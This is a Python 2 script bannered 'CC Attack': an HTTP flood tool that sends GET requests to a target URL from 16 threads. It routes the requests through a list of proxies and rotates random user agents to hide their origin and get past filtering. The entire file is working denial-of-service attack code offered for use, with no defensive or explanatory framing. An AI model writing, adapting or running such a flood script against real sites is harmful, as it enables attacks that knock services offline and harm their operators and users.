#!/usr/bin/env python
# encoding:utf8
import requests
from threading import Thread
import sys
import Queue
import random

__author__ = 'whois'
__date__   = '17/5/17'

with open('pytxt/user-agents.txt','r') as f:
    agents_list = [ line.rstrip() for line in f.readlines()]

if len(sys.argv) == 1:
    print "[+]-----------------CC Attack----------------[+]"
    print ""
    print "[*] python {0} [target] <proxy_ip>".format(sys.argv[0])
    exit(1)

TARGET = sys.argv[1]
IPFILES = sys.argv[2] if len(sys.argv) == 3 else 'output/proxy_ips.txt'

proxy_ip = Queue.Queue()
with open(IPFILES,'r') as f:
    for line in f.readlines():
         proxy_ip.put(line.rstrip()) 

def cc(proxy_ip):
    HEADERS = {'user-agent':random.choice(agents_list)}
    try:
        r = requests.get(TARGET, headers=HEADERS,timeout=8, proxies={'http':proxy_ip})
        if r.status_code == 200:
            print proxy_ip
    except:
        pass

def attack():
    while not proxy_ip.empty():
        cc(proxy_ip.get())

def main():
    threads_list = []
    threads = 16

    for i in range(threads):
        t = Thread(target=attack)
        t.start()
        threads_list.append(t)
    for i in range(threads):
        threads_list[i].join()

if __name__ == '__main__':
    main()
